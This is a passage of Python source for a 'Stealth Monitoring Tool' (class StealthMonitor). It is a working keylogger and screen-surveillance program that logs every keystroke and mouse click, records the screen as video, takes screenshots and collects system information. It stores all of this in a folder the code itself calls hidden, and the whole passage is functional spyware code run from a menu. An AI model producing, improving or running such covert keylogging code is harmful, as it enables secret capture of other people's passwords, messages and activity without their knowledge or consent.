            screen_size = pyautogui.size()
            
            # Define codec and create VideoWriter object
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filepath, fourcc, self.config['recording_fps'], screen_size)
            
            start_time = time.time()
            
            print(f"🎥 Starting recording: {filename}")
            
            while (time.time() - start_time) < self.recording_duration and self.is_monitoring:
                # Capture screen
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Write frame
                out.write(frame)
                
                # Small delay to control frame rate
                time.sleep(1/self.config['recording_fps'])
            
            # Release everything
            out.release()
            
            self.recording_count += 1
            print(f"✅ Recording saved: {filename}")
            
            # Log recording activity
            self.log_activity(f"Recording saved: {filename}")
            
            return True
        except Exception as e:
            print(f"❌ Error recording screen: {e}")
            return False
    
    def on_key_press(self, key):
        """Handle key press events."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key_str = str(key).replace("'", "")
            
            # Special keys handling
            if hasattr(key, 'name'):
                key_str = f"[{key.name.upper()}]"
            
            self.key_log.append({
                'timestamp': timestamp,
                'key': key_str,
                'action': 'press'
            })
            
            # Save keylog periodically
            if len(self.key_log) >= 10:
                self.save_keylog()
        
        except Exception as e:
            print(f"Error in key logger: {e}")
    
    def on_click(self, x, y, button, pressed):
        """Handle mouse click events."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        self.mouse_log.append({
            'timestamp': timestamp,
            'x': x,
            'y': y,
            'button': str(button),
            'action': 'click' if pressed else 'release'
        })
        
        # Save mouselog periodically
        if len(self.mouse_log) >= 20:
            self.save_mouselog()
    
    def save_keylog(self):
        """Save keylog to file."""
        if not self.key_log:
            return
        
        log_file = os.path.join(self.hidden_folder, 'logs', 'keylog.json')
        
        try:
            # Read existing log
            existing_log = []
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    existing_log = json.load(f)
            
            # Append new entries
            existing_log.extend(self.key_log)
            self.key_log = []
            
            # Save back to file
            with open(log_file, 'w') as f:
                json.dump(existing_log, f, indent=2)
                
        except Exception as e:
            print(f"Error saving keylog: {e}")
    
    def save_mouselog(self):
        """Save mouselog to file."""
        if not self.mouse_log:
            return
        
        log_file = os.path.join(self.hidden_folder, 'logs', 'mouselog.json')
        
        try:
            # Read existing log
            existing_log = []
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    existing_log = json.load(f)
            
            # Append new entries
            existing_log.extend(self.mouse_log)
            self.mouse_log = []
            
            # Save back to file
            with open(log_file, 'w') as f:
                json.dump(existing_log, f, indent=2)
                
        except Exception as e:
            print(f"Error saving mouselog: {e}")
    
    def log_activity(self, message):
        """Log general activity."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        log_file = os.path.join(self.hidden_folder, 'logs', 'activity.log')
        
        with open(log_file, 'a') as f:
            f.write(log_entry)
    
    def cleanup_old_files(self):
        """Clean up old files to avoid disk space issues."""
        max_size = self.config['max_file_size_mb'] * 1024 * 1024  # Convert to bytes
        
        for folder in ['screenshots', 'recordings']:
            folder_path = os.path.join(self.hidden_folder, folder)
            
            if not os.path.exists(folder_path):
                continue
            
            # Get total size
            total_size = 0
            for file in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file)
                total_size += os.path.getsize(file_path)
            
            # If over limit, delete oldest files
            if total_size > max_size:
                files = []
                for file in os.listdir(folder_path):
                    file_path = os.path.join(folder_path, file)
                    files.append((os.path.getctime(file_path), file_path))
                
                # Sort by creation time (oldest first)
                files.sort()
                
                # Delete until under limit
                for creation_time, file_path in files:
                    if total_size <= max_size:
                        break
                    
                    file_size = os.path.getsize(file_path)
                    os.remove(file_path)
                    total_size -= file_size
                    
                    print(f"🧹 Cleaned up: {os.path.basename(file_path)}")
    
    def screenshot_worker(self):
        """Worker thread for taking screenshots."""
        while self.is_monitoring:
            self.take_screenshot()
            
            # Wait for interval
            for _ in range(self.screenshot_interval):
                if not self.is_monitoring:
                    break
                time.sleep(1)
    
    def recording_worker(self):
        """Worker thread for recording."""
        while self.is_monitoring:
            self.record_screen()
            
            # Small delay between recordings
            for _ in range(5):  # 5 second break between recordings
                if not self.is_monitoring:
                    break
                time.sleep(1)
    
    def monitoring_worker(self):
        """Main monitoring worker."""
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()
        
        # Start mouse listener
        mouse_listener = MouseListener(on_click=self.on_click)
        mouse_listener.start()
        
        # Start screenshot thread
        screenshot_thread = threading.Thread(target=self.screenshot_worker)
        screenshot_thread.daemon = True
        screenshot_thread.start()
        
        # Start recording thread
        recording_thread = threading.Thread(target=self.recording_worker)
        recording_thread.daemon = True
        recording_thread.start()
        
        print("🚀 Monitoring started...")
        print(f"📁 Data stored in: {self.hidden_folder}")
        print("Press Ctrl+C to stop monitoring")
        
        try:
            while self.is_monitoring:
                # Check internet connection every minute
                internet_status = "✅ Online" if self.check_internet_connection() else "❌ Offline"
                
                # System status update every 5 minutes
                if int(time.time()) % 300 == 0:
                    system_info = self.get_system_info()
                    info_file = os.path.join(self.hidden_folder, 'data', 'system_info.json')
                    with open(info_file, 'w') as f:
                        json.dump(system_info, f, indent=2)
                    
                    # Cleanup old files
                    self.cleanup_old_files()
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop_monitoring()
        
        finally:
            # Stop listeners
            keyboard_listener.stop()
            mouse_listener.stop()
            
            # Save remaining logs
            self.save_keylog()
            self.save_mouselog()
    
    def start_monitoring(self):
        """Start the monitoring process."""
        if self.is_monitoring:
            print("⚠️ Monitoring is already running")
            return
        
        self.is_monitoring = True
        
        # Save initial system info
        system_info = self.get_system_info()
        info_file = os.path.join(self.hidden_folder, 'data', 'system_info.json')
        with open(info_file, 'w') as f:
            json.dump(system_info, f, indent=2)
        
        # Save config
        self.save_config()
        
        # Log startup
        self.log_activity("Monitoring started")
        
        # Start monitoring
        self.monitoring_worker()
    
    def stop_monitoring(self):
        """Stop the monitoring process."""
        if not self.is_monitoring:
            print("⚠️ Monitoring is not running")
            return
        
        self.is_monitoring = False
        self.log_activity("Monitoring stopped")
        print("🛑 Monitoring stopped")
    
    def show_status(self):
        """Show current monitoring status."""
        status = "ACTIVE" if self.is_monitoring else "INACTIVE"
        print(f"\n📊 Monitoring Status: {status}")
        print(f"📁 Storage Location: {self.hidden_folder}")
        
        # Show file counts
        screenshots_path = os.path.join(self.hidden_folder, 'screenshots')
        recordings_path = os.path.join(self.hidden_folder, 'recordings')
        
        screenshot_count = len([f for f in os.listdir(screenshots_path) if f.endswith('.jpg')]) if os.path.exists(screenshots_path) else 0
        recording_count = len([f for f in os.listdir(recordings_path) if f.endswith('.avi')]) if os.path.exists(recordings_path) else 0
        
        print(f"📸 Screenshots: {screenshot_count}")
        print(f"🎥 Recordings: {recording_count}")
        print(f"🌐 Internet: {'✅ Online' if self.check_internet_connection() else '❌ Offline'}")

def main():
    """Main function."""
    monitor = StealthMonitor()
    
    print("🕵️‍♂️ Stealth Monitoring Tool")
    print("=" * 50)
    
    while True:
        print("\nOptions:")
        print("1. Start Monitoring")
        print("2. Stop Monitoring")
        print("3. Show Status")
        print("4. Take Single Screenshot")
        print("5. Configuration")
        print("6. Exit")
        
        choice = input("\nEnter your choice (1-6): ").strip()
        
        if choice == '1':
            monitor.start_monitoring()
        elif choice == '2':
            monitor.stop_monitoring()
        elif choice == '3':
            monitor.show_status()
        elif choice == '4':
            monitor.take_screenshot()
        elif choice == '5':
            print("\nConfiguration:")
            for key, value in monitor.config.items():
                print(f"{key}: {value}")
            
            change = input("\nChange configuration? (y/n): ").lower()
            if change == 'y':
                key = input("Enter setting name: ").strip()
                if key in monitor.config:
                    new_value = input(f"Enter new value for {key} (current: {monitor.config[key]}): ").strip()
                    # Try to convert to appropriate type
                    if isinstance(monitor.config[key], bool):
                        monitor.config[key] = new_value.lower() in ['true', 'yes', '1', 'y']
                    elif isinstance(monitor.config[key], int):
                        try:
                            monitor.config[key] = int(new_value)
                        except:
                            print("Invalid integer value")
                    elif isinstance(monitor.config[key], float):
                        try:
                            monitor.config[key] = float(new_value)
                        except:
                            print("Invalid float value")
                    else:
                        monitor.config[key] = new_value
                    
                    monitor.save_config()
                    print("✅ Configuration updated")
                else:
                    print("❌ Invalid setting name")
        elif choice == '6':
            if monitor.is_monitoring:
                monitor.stop_monitoring()
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice")

if __name__ == "__main__":
    # Import required modules that were installed
    import socket
    import psutil
    import pyautogui
    import cv2
    from PIL import Image
    import numpy as np
    from pynput import keyboard
    from pynput.mouse import Listener as MouseListener
    
    main()
